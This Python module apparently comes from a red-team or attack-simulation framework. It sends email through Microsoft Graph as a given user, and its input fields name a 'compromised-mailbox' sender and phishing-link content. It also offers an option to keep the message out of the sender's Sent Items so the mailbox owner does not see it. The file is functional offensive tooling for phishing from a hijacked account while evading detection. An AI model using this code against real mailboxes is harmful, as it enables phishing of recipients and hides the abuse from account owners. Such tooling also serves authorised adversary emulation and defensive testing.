from core.GraphFunctions import graph_post_request

def TechniqueMain(user_id, subject, message_content, to_recipient, hide_from_mailbox = False, cc_recipient = None):

    endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/sendMail"

    data = {
        "message" : {
            "subject" : subject,
            "body" : {
                "contentType" : "Text",
                "content" : message_content
            },
            "toRecipients": [
                {
                    "emailAddress": {
                        "address": to_recipient
                    }
                }
            ],
        },
        "saveToSentItems": "true"
    }  

    if hide_from_mailbox == True:
        data.update({"saveToSentItems" : "false"})

    # if cc_recipient:
    #     data["ccRecipients"] = [
    #         {
    #             "emailAddress": {
    #             "address": {cc_recipient}
    #             }
    #         }
    #         ]

    send_mail = graph_post_request(url=endpoint_url , data=data)

    return send_mail

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Sender Mailbox Address", "id" : "sender-email-address-text-input", "type" : "email", "placeholder" : "compromised-mailbox@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Subject", "id" : "subject-text-input", "type" : "text", "placeholder" : "Seriously-Legitimate-Forwarding-Rule", "element_type" : "dcc.Input"},
        {"title" : "Email Content", "id" : "email-content-text-input", "type" : "text", "placeholder" : "Drop that Phishing Link", "element_type" : "dcc.Input"},
        {"title" : "Recipient Mailbox Address", "id" : "recipient-email-address-text-input", "type" : "text", "placeholder" : "another-mailbox@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Hide Email from Sender's Mailbox", "id" : "save-to-sent-items-boolean-switch", "type" : "email", "placeholder" : "attacker@attacker.com", "element_type" : "daq.BooleanSwitch"}
    ]